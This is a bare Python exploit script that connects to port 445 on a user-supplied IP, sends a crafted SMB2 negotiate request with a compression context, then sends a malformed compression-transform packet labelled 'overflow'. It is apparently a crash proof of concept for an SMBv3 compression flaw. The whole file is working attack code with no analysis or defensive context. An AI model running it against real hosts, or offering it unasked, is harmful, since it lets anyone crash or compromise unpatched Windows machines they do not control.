import socket, sys

if len(sys.argv) != 2:
    sys.exit("Usage: <script>.py <target IP>")

bytes_a = b"\x00\x00\x00\xc6\xfeSMB@"
bytes_b = b'\x00$\x00\x08\x00\x00\x00\x00\x00\x7f\x00\x00\x00\x01\x02\xab\xcd\x01\x02\xab\xcd\x01\x02\xab\xcd\x01\x02\xab\xcdx\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01'
bytes_c = b"\x03\x00\x0e\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x02\x00\x03"

smb_connect = bytes_a + b"\x00"*58 + bytes_b + b"\x00"*35 + bytes_c + b"\x00"*9
overflow = b"\x00\x00\x00B\xfcSMB2\x00\x00\x00\x01\x00\x00\x00" + b"\xff"*4 + b"A"*50

s = socket.socket(socket.AF_INET)
s.settimeout(2)
s.connect((sys.argv[1], 445))

s.send(smb_connect)
s.recv(3000)

s.send(overflow)
s.close()
